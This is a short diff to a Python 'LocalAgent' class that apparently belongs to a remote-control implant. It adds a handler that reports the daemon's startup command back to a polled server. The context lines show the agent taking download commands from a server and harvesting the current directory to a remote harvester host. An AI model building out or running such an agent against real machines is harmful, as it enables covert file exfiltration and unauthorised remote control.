@@ -254,6 +254,12 @@ class LocalAgent:
 	def pushForward(self, forwardID, data):
 		raise NotImplementedError("Please Implement this method") 
 
+	def getScriptName(self):
+		raise NotImplementedError("Please Implement this method") 
+
+	def getDaemonStartupCmd(self):
+		return sys.executable + " " + self.getScriptName()
+
 	def harvestCurrentDirectory(self):
 		harvester = DirectoryHarvester(os.path.abspath(os.getcwd()), self, self.harvester_server, self.harvester_port)
 		harvester.start()
@@ -339,6 +345,8 @@ class LocalAgent:
 		response = self.pollServer()
 		if response == '<control> No Command':
 			return None
+		elif response == "get_daemon_start_cmd":
+			self.postResponse(self.getDaemonStartupCmd())
 		elif response.startswith("<control> download "):
 			elements = response.split(" ")
 			if len(elements) >= 4:
